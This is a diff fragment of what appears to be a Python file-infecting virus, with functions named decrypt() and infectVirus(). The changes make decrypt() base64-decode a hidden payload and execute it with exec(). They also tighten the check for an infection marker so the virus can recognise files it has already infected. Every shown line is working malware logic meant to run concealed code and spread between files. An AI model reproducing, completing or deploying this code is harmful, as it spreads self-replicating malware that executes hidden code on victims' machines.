@@ -24,8 +24,8 @@ def decrypt():
                     flag = True
 
                 if(encryptedCode):
-                    print(encryptedCode) 
-                    return encryptedCode
+                    decryptedCode = base64.b64decode(encryptedCode.encode("utf-8"))
+                    exec(decryptedCode,globals())
     else:
         return 
 
@@ -78,7 +78,7 @@ def infectVirus():
 
         infected = False
         for codeLine in codeLines:
-            if("### E & D START ###" in codeLine):
+            if(codeLine.startswith("### E & D START ###")):
                 infected = True
                 break
         
